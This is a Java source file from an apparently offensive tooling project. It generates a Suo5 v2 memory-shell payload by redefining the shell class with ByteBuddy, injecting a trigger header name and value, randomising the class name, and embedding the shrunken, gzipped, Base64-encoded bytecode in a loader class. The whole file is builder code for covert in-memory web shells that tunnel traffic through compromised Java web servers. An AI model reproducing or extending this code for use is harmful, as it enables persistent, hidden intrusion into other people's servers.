package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.Suo5Config;
import com.reajason.javaweb.memshell.shelltool.suo5v2.Suo5v2;
import com.reajason.javaweb.utils.CommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.apache.commons.codec.binary.Base64;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/2/12
 */
public class Suo5V2Generator extends ByteBuddyShellGenerator<Suo5Config> {

    public Suo5V2Generator(ShellConfig shellConfig, Suo5Config suo5Config) {
        super(shellConfig, suo5Config);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        if (Suo5v2.class.equals(shellToolConfig.getShellClass())) {
            return new ByteBuddy()
                    .redefine(shellToolConfig.getShellClass())
                    .field(named("headerName")).value(shellToolConfig.getHeaderName())
                    .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
        }
        try (DynamicType.Unloaded<Suo5v2> unloaded = new ByteBuddy()
                .redefine(Suo5v2.class)
                .name(CommonUtil.generateClassName())
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue())
                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
                .make()) {
            byte[] shrinkBytes = ClassBytesShrink.shrink(unloaded.getBytes(), true);
            return new ByteBuddy()
                    .redefine(shellToolConfig.getShellClass())
                    .field(named("suo5V2GZipBase64")).value(Base64.encodeBase64String(CommonUtil.gzipCompress(shrinkBytes)));
        }
    }
}
